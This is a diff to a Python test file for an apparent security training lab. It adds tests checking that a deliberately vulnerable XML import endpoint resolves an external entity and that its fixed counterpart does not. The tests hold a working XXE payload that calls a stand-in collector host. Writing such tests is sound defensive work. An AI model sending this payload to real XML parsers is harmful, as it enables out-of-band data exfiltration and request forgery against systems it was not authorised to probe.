@@ -4,6 +4,7 @@ import json
 import re
 import sys
 import threading
+from unittest import mock
 import unittest
 from http.server import ThreadingHTTPServer
 from pathlib import Path
@@ -127,6 +128,29 @@ class LabTest(unittest.TestCase):
         self.assertEqual(status, 200)
         data = json.loads(body)["data"]
         self.assertEqual(len([k for k in data if k.startswith("egideAlias")]), 30)
+
+    def _xxe_body(self):
+        return ('<?xml version="1.0" encoding="UTF-8"?>'
+                '<!DOCTYPE egide [<!ENTITY xxe SYSTEM "http://collector.example/egideoob7a1b2c">]>'
+                '<egide><ping>&xxe;</ping></egide>')
+
+    def test_vulnerable_import_resolves_an_external_xml_entity(self):
+        import lab_services
+        with mock.patch.object(lab_services.urllib.request, "urlopen") as fake, \
+                mock.patch.object(lab_services, "public_host", return_value=True):
+            fake.return_value.read.return_value = b""
+            status, _ = self.call("POST", "/servicos/vulneravel/importar", payload=self._xxe_body())[:2]
+            self.assertEqual(status, 200)
+            fake.assert_called_once()
+            self.assertIn("egideoob7a1b2c", fake.call_args[0][0])
+
+    def test_fixed_import_ignores_the_external_entity(self):
+        import lab_services
+        with mock.patch.object(lab_services.urllib.request, "urlopen") as fake, \
+                mock.patch.object(lab_services, "public_host", return_value=True):
+            status, _ = self.call("POST", "/servicos/corrigido/importar", payload=self._xxe_body())[:2]
+            self.assertEqual(status, 200)
+            fake.assert_not_called()
 
     def test_fixed_graphql_caps_the_alias_batch(self):
         query = "{" + " ".join(f"egideAlias{i}: faturas" for i in range(30)) + "}"
